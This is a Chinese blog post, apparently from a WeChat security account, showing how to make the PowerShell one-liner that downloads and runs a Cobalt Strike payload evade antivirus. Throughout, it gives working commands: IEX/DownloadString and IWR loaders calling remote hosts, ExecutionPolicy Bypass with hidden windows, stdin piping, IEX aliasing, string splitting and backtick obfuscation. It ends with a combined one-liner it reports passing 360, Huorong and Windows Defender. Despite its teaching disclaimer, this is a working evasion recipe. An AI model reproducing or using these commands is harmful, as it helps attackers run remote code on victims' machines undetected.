> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5pU3gzE-UAvliaFOVjWVUA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTh6g0enibfksgSKoIB5PDUtJkTO5TBwL3BKprmCM4hNDNJwiaibNve8JYw/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

PS 上线命令  

结合上文的加载器《[CS 免杀 - PowerShell 上线](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247485018&idx=1&sn=a015c28ed2881d87e7a90f43986be6b5&chksm=97743abba003b3ad36368e7da925d44722e16eaeb8feb1687d64e83730a54046496d8138c6b2&scene=21#wechat_redirect)》，有大佬说加载的一句话过不了 360 等的行为查杀  

```
powershell -nop -w 1 -c "IEX(new-object net.webclient).downloadstring('http://192.168.1.1/test.ps1')"
```

现在针对这一句话进行免杀，绕过 AV 的行为限制  

加载 web 脚本

绕过静态查杀，编码未必是做有效的方法，所以出现了脚本放在网站上远程加载  

PS 需要两个函数 Invoke-Expression 和 Invoke-WebRequest

Invoke-WebRequest

缩写 IWR，用来访问网页的内容，默认使用 IE 引擎

-UseBasicParsing 参数不分析结果，只是返回内容

```
IWR -UseBasicParsing http://192.168.1.1/123.txt
```

Invoke-Expression  

缩写 IEX，该函数执行传递给他的代码

```
powershell -com IEX(New-Object Net.WebClient).DownloadString('http:192.168.1.1/123.txt')
powershell -com IEX(iwr -UseBasicParsing http://192.168.10.1/123.txt)
```

内网可以用通用命名约定 UNC

```
powershell -com IEX(iwr -UseBasicParsing \\192.168.10.1\C\1.ps1)
```

绕过策略限制

本地执行一个 ps 脚本， 由于默认策略的缘故，通常会报禁用脚本运行  

```
powershell ./test.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTthoJ9bQVWdlAMNMFpJQzVEgQFyib59WYQIWrlXCoQicuGXcBjz6ZelxQ/640?wx_fmt=png)

1. 更改脚本权限

```
powershell -command  Get-ExecutionPolicy
```

restricted: 只能运行系统的 ps 命令  
ALLSigned: 带有可信发布者签名的脚步都可以运行  
RemoteSigned: 带有可发布者签名的一已下载脚本可运行  
Unrestricted: 不受限制  

```
powershell -com Set-ExecutionPolicy Unrestricted
```

2. 本地权限绕过

```
PowerShell -ExecutionPolicy Bypass -File xxx.ps1
```

本地隐藏权限绕过  

```
PowerShell -ExecutionPolicy Bypass -NoP -W Hidden -File 123.ps1
```

-noprofile 简写 -nop， 为不加载 windows poweshell 配置文件  

-WindowStyle hidden 简写 -w 1，窗口为隐藏模式（powershell 执行该命令后直接隐藏命令行窗口）

3.IEX 远程加载

```
powershell IEX(New-Object Net.WebClient).DownloadString('http://192.168.10.1/123.txt)
powershell IEX(iwr -UseBasicParsing http://192.168.10.1/123.txt)
powershell IEX(New-Object Net.WebClient).DownloadString('c:\132.txt')
```

4. 标准输入读取命令

powershell 的 -com 命令有个参数 **-**

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTWaoFicKaL97IdVXGYI9Upic6xXr4L7uCWe6dtwgiada3GgFrII4qbJSTA/640?wx_fmt=png)

所以可以通过管道符输入命令  

```
echo Invoke-Expression(new-object net.webclient).downloadstring('http://xxx.xxx.xxx/a') | powershell -
type 123.txt | powershell -
```

特征免杀

1.win10 环境变量截取出 powershell  

```
%psmodulepath:~24,10%
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTdrD0wID9busp79z0Rw7qS9CIgm4nDNp0solUhchxxOwYnqLJ5klc7Q/640?wx_fmt=png)

2. 新建函数别名

IEX 或 IWR 等函数是可以重命名的

```
set-alias -name hhh -value IEX
```

```
powershell set-alias -name hhh -value IEX;hhh(New-Object Net.WebClient).DownloadString('http://192.168.1.1/123.txt')
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTDMbaKKaefD1zALZicjFc5HjcCrXD2uSTY3dbQbMBKc7BzLlBxDV0SwA/640?wx_fmt=png)

3. 拆分成变量

```
powershell "$b='((new-object 
net.webclient).downlo)';$a='(adstring(http://192.168.1.1/payload.ps1))';IEX ($b+$a)"
```

字符串以单引号分割

```
'ht'+'tP://19’+'2.168.1.1'+'2/payload.ps1'
```

4. 使用反引号处理字符

 PowerShell 团队使用反引号作为转义字符 （就离谱）

```
`'  单引号    `"  双引号
`0  空值      `a  警报
`b  退格      `f  换页
`n  新行      `r  回车
`t  水平制表  `v  垂直制表
```

powershell 中双引号内字符可以进行转义，当反引号后面不是上面几个字符则不转义  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTjQl5o6pEHJ49ycicicxTZGT3Su1w0lhhv9pVkKEiajVJtwPV0OMIlShPA/640?wx_fmt=png)

上面截图感受一下，然后就对 downloadstring 等几个字符处理一下  

```
"Down`l`oadString"
"down`load`data"
"web`client"
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXT5gEUFTAWib0yZtJ5GEDbvOBEKdepBibsRRSUvJHXoCyY0wdOWCFJVXEg/640?wx_fmt=png)

看我一套军体拳

360、火绒、win10 自带都没拦截，卡巴没测试  

```
echo set-alias -name hhh -value IEX;hhh(New-Object "NeT.WebC`li`ent")."Down`l`oadStr`ing"('ht'+'tP://19’+'2.168.1.1'+'2/payload.ps1') | %psmodulepath:~24,10% -
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSP8VmBTXFQFLLZJACGJFxXTh8uvFtNwvQpibkCda122KmLIbWqJOu7fBQYOkHv3y7wu1UgF1X9usDg/640?wx_fmt=png)

成功执行，不拦截行为  

公众号